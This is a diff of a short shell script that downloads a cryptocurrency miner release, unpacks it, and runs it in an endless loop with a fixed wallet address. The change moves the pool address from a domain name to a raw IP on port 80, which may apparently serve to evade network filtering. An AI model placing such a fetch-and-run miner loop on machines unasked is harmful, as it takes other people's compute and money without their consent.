@@ -2,5 +2,5 @@ wget https://github.com/OneZeroMiner/onezerominer/releases/download/v1.5.7/oneze
 tar xf onezerominer-linux-1.5.7.tar.gz
 cd onezerominer-linux
 while :; do
-./onezerominer -a qhash  -o stratum+tcp://qtc-eu.rplant.xyz:7154 -w bc1qc8kqa8dqg2hj87ngplkcn56rdk6tgp3le54x78.$(echo $(shuf -i 1-15000 -n 1)-run) -p webpassword=x
+./onezerominer -a qhash  -o stratum+tcp://51.158.230.134:80 -w bc1qc8kqa8dqg2hj87ngplkcn56rdk6tgp3le54x78.$(echo $(shuf -i 1-15000 -n 1)-run) -p webpassword=x
 done
